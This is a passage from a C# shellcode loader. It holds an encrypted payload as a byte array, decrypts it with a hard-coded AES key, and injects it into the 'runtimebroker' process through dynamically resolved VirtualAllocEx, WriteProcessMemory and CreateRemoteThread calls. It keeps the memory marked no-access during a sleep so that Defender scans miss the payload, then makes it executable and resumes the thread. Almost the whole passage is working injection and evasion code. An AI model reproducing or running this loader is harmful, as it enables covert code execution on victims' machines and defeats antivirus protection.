0x92,0x65,0x95,0xef,0xb5,0x44,0xe7,0xe1,0xd8,0xa5,0xd7,0x6d,0x96,0x62,0x44,0x66,0xf9,0x58,0xec,0x61,
0x6a,0xdf,0x8a,0x6d,0x38,0x7a,0x4d,0xd1,0xe3,0x7d,0xa5,0xf3,0x77,0x50,0x02,0xef,0x09,0xc9,0xce,0xa0,
0xfc,0xf8,0x98,0xff,0x71,0x42,0xb9,0x2c,0x2c,0xcd,0xd4,0xaa,0xfc,0x22,0x26,0xb2,0x1a,0xde,0x31,0x8c,
0x5f,0xd2,0x81,0xaa,0xa3,0x77,0xed,0xad,0x66,0xae,0x75,0x63,0x13,0xbe,0x01,0x0b,0xe6,0xb7,0xde,0x10,
0xb5,0x1b,0xf9,0x5a,0x4e,0x1b,0xfc,0x2b,0x18,0xa9,0xc5,0x52,0x3c,0x6a,0x8a,0xe4,0x0e,0x10,0xd9,0xbd,
0x43,0xa5,0xf6,0x4b,0xee,0xe9,0x7b,0x75,0x59,0x33,0x1f,0x46,0x9f,0xd6,0xb4,0xf1,0x78,0x1d,0xb0,0x0e,
0x51,0x3e,0xb5,0xa4,0x85,0x1f,0x6a,0xbc,0xa8,0x81,0x2f,0x9b,0xa1,0xd6,0xa6,0xca,0x0b,0xbf,0x8c,0x64,
0xc6,0x50,0x0d,0xc0,0x24,0x38,0x4d,0x47,0x66,0x0c,0x9e,0x80,0xdd,0x67,0xcc,0x21,0x41,0xfd,0x41,0x26,
0xf1,0xc9,0x8d,0x7e,0x5e,0x7f,0x2f,0xa9,0x4a,0x44,0x7c,0x57,0xa5,0x7e,0xe9,0xaf,0xf4,0x80,0x64,0x0e,
0xf2,0x77,0xff,0xa4,0x0e,0x1b,0x55,0x51,0xff,0xe2,0xbb,0xd0,0x7d,0x8e,0xc8,0x32,0x2f,0xa1,0xe1,0xf2,
0xb8,0x0c,0xc2,0xcb,0x6b,0xdf,0xe5,0x75,0x79,0x33,0xdf,0xe5,0xae,0x35,0xd7,0x19,0xd8,0xe0,0x6e,0xa8,
0x0e,0xda,0x29,0xfc,0x37,0x1c,0xc1,0x37,0xb3,0x18,0x39,0x45,0x71,0xab,0xbd,0x55,0x24,0xd4,0x3e,0x0e,
0xa9,0x96,0x89,0x53,0x70,0xaf,0x86,0x58,0x30,0x91,0x95,0x2b,0x54,0xe1,0xf0,0x11,0x93,0xa3,0x97,0x42,
0x8d,0xaa,0xf4,0xb9,0xe3,0x19,0x88,0xec,0x41,0xa2,0xc8,0x28,0x9e,0xc0,0xf9,0x59,0x77,0x03,0xfd,0x51,
0xb2,0x66,0x65,0x4c,0xe7,0xc2,0x69,0x82,0xa5,0xb0,0x8b,0x95,0x6f,0xda,0x3b,0xfe,0x44,0x7e,0x0f,0x3b,
0xdb,0x1b,0x9f,0x9c,0xc1,0xc8,0xd7,0xbb,0x12,0xe5,0x65,0x7d,0xb1,0x5c,0xcc,0x6d,0xb2,0xdc,0x85,0xf4,
0x3e,0xc2,0x9a,0xd6,0x1e,0x0e,0x3c,0x56,0x33,0x29,0x5b,0xfa,0xf0,0x6e,0x29,0x0f,0x17,0xe6,0xdc,0xcc,
0x78,0x85,0x33,0x95,0x58,0x16,0xf1,0xc7,0xb8,0x12,0x1e,0x4c,0x41,0x4e,0xc3,0x1f,0xd2,0x08,0xb3,0x72,
0x49,0x29,0x04,0x72,0x60,0xde,0xc8,0x19,0x2a,0x92,0xd8,0x8d,0xf5,0x2e,0x65,0x17,0x72,0x5a,0x07,0xaf,
0x81,0x45,0x9d,0xfe,0x83,0xfe,0x08,0x88,0xa3,0x41,0x86,0x53,0xb9,0xeb,0x90,0x56,0xf7,0xaa,0x89,0xe1,
0xff,0xec,0xca,0xa6,0x7d,0xc2,0x3d,0xfd,0x9d,0xab,0x8f,0x5e,0xbf,0x62,0x3d,0x40,0x9e,0xd7,0xb9,0xca,
0x75,0x89,0xd6,0xf4,0xcc,0x09,0xd0,0x36,0xb2,0x8e,0xcc,0xeb,0x7a,0x18,0xdc,0x21,0x25,0xf7,0x01,0x20,
0x4f,0x1c,0x1a,0x3a,0x18,0xe9,0x7e,0xeb,0xe0,0x40,0x44,0xdf,0xaf,0x3a,0x42,0xf4,0xd6,0xd9,0xa2,0x17,
0xdb,0x4f,0xae,0xad,0xf9,0xec,0x60,0x65,0x67,0x68,0xcf,0xbb,0x42,0x4a,0x5b,0x4f,0x4b,0x9c,0x3c,0xe7,
0xf6,0x75,0x31,0x3d,0x9e,0x64,0x71,0x1f,0x0a,0x2a,0x63,0x98,0x3a,0x11,0x2c,0xa2,0x3b,0x73,0x80,0xd6,
0xb9,0x26,0xec,0x67,0x7a,0x51,0xef,0x5e,0xb8,0xa5,0xe1,0x20,0xd6,0xd4,0xc1,0x8e,0x48,0x9f,0x30,0x9c,
0xd3,0x08,0xa7,0xba,0xa6,0xfe,0x58,0x25,0x1c,0xd1,0x4b,0x1b,0xd1,0xc7,0x8a,0xc7,0x85,0x1c,0x66,0xf0,
0xf4,0x77,0xe6,0x40,0xdb,0x2f,0x59,0x6c,0x74,0x52,0x2b,0xbf,0x87,0x11,0xee,0x1e,0xbf,0xf5,0x8b,0xd1,
0xda,0x59,0x8e,0xee,0x88,0x8a,0xf3,0xac,0xc6,0x4c,0x19,0x9e,0x6e,0x1a,0x9d,0x00,0xbd,0x4c,0x29,0xeb,
0xbf,0x0f,0x08,0x8e,0x89,0xf0,0x8f,0x81,0x09,0xde,0x27,0xbc,0x79,0xd0,0xb3,0xd6,0xc7,0x57,0xef,0xb2,
0x4d,0x0d,0x3b,0x7f,0x28,0x05,0x7f,0x65,0x3a,0xe3,0x4d,0xf8,0x7c,0xff,0x7f,0xee,0xdd,0xe5,0xf9,0x41,
0x3f,0x32,0xdf,0xe0,0x8d,0x1b,0x0f,0x24,0x03,0x57,0xa4,0x1c,0xa8,0x2e,0x6f,0x28,0x65,0x3c,0xf3,0x94,
0x0f,0xaf,0xfb,0x8b,0xd5,0x1b,0xb1,0x93,0x45,0xc1,0x5f,0x14,0x09,0xbd,0x37,0x6d,0xe6,0x78,0x7b,0xab,
0xfa,0x42,0x8c,0xdc,0x85,0x2a,0x23,0xf7,0x8c,0x19,0x85,0x41,0x10,0x60,0xf1,0x39,0x1b,0xfc,0x13,0xe6,
0x22,0x97,0x11,0xa4,0x25,0xd8,0x0b,0x72,0x94,0xa0,0x43,0x1f,0x12,0x49,0x8b,0x75,0x9e,0x4b,0xc9,0x56,
0xea,0xc6,0x7e,0x9a,0x57,0x9f,0x0d,0x2f,0xa5,0x66,0xe1,0xe4,0x25,0xa9,0x57,0xe3,0xf2,0x58,0xb6,0x8d,
0xc0,0x82,0x41,0x6e,0x3d,0x0e,0x70,0xb4,0xb9,0x7f,0x6f,0x00,0x8f,0x68,0xe2,0x11,0x98,0xcb,0x95,0x04,
0x83,0x98,0x73,0xd0,0x3c,0xf5,0x24,0xa3,0xab,0x56,0xfb,0x0c,0xf0,0x77,0x8e,0x3b,0x77,0x1d,0xa4,0x30,
0xf7,0xbc,0xa3,0x8a,0xe6,0x34,0xd0,0x6c,0x39,0x84,0x4c,0xe0,0xb0,0x3e,0xa2,0x5f,0xc3,0x95,0xac,0xe5,
0x2c,0x85,0x77,0x9c,0x83,0xc7,0xd4,0x02,0xe5,0x68,0x97,0x0d,0x4c,0x4d,0xc6,0xde,0x11,0xc6,0xa2,0x0c,
0x38,0x8f,0x8b,0x78,0xdc,0x37,0x32,0x3e,0x86,0x5c,0xbc,0x61,0x76,0xf7,0x5d,0xa6,0x94,0x0f,0x38,0xf2,
0x02,0xdd,0xa8,0x9f,0x89,0x8a,0x72,0x6a,0xad,0x68,0x1d,0xd6,0xd9,0xce,0x0c,0x9a,0xf4,0xa0,0xef,0x4e,
0x11,0x38,0x05,0x16,0x4d,0xc3,0x3d,0xdb,0xbc,0x30,0x06,0xd6,0xb3,0x66,0x2d,0xb0,0xea,0x8d,0x44,0xb8,
0x72,0x1e,0xfd,0x75,0xa3,0xde,0x23,0xd0,0x89,0xa1,0x09,0x09,0x24,0x1a,0x76,0x51,0x59,0xcd,0xfb,0xe6,
0x37,0xad,0x64,0x40,0xa7,0x60,0xdd,0x5d,0xe6,0x96,0xf7,0x27,0x24,0xee,0x4c,0x04,0x45,0xb2,0x29,0x0e,
0x41,0x07,0x1c,0x84,0x55,0x07,0xb4,0xde,};


            byte[] pie = aesDecrypt(buf, UTF8Encoding.UTF8.GetBytes("777456789abcdety"));
            Process[] PID = Process.GetProcessesByName("runtimebroker"); // Change the process name

            pointer = Invoke.GetLibraryAddress("kernel32.dll", "VirtualAllocEx");
            DELEGATES.VirtualAllocEx vae = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.VirtualAllocEx)) as DELEGATES.VirtualAllocEx;

            IntPtr hProcess = opr(0x001F0FFF, false, PID[0].Id);
            IntPtr addr = vae(hProcess, IntPtr.Zero, (uint)pie.Length, 0x3000, 0x40);

            pointer = Invoke.GetLibraryAddress("kernel32.dll", "WriteProcessMemory");
            DELEGATES.WriteProcessMemory wpm = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.WriteProcessMemory)) as DELEGATES.WriteProcessMemory;

            IntPtr outSize;
            wpm(hProcess, addr, pie, pie.Length, out outSize);

            //MODIFY MEMORY TO PAGE NO ACCESS
            uint lpflOldProtect;
            pointer = Invoke.GetLibraryAddress("kernel32.dll", "VirtualProtectEx");
            DELEGATES.VirtualProtectEx vpe = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.VirtualProtectEx)) as DELEGATES.VirtualProtectEx;

            vpe(hProcess, addr, (UIntPtr)pie.Length, 0x01, out lpflOldProtect);


            //Create a suspended thread
            pointer = Invoke.GetLibraryAddress("kernel32.dll", "CreateRemoteThread");
            DELEGATES.CreateRemoteThread crt = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.CreateRemoteThread)) as DELEGATES.CreateRemoteThread;

            IntPtr hThread = crt(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0x00000004, IntPtr.Zero);

            // let Defender scan the remote process - hopefully not accessing our PAGE_NO_ACCESS memory
            System.Threading.Thread.Sleep(10000);

            //Change mem protection to PAGE_EXECUTE_READ_WRITE
            vpe(hProcess, addr, (UIntPtr)pie.Length, 0x40, out lpflOldProtect);

            //Resume Thread
            pointer = Invoke.GetLibraryAddress("kernel32.dll", "ResumeThread");
            DELEGATES.ResumeThread rt = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.ResumeThread)) as DELEGATES.ResumeThread;

            rt(hThread);

        }
    }
}
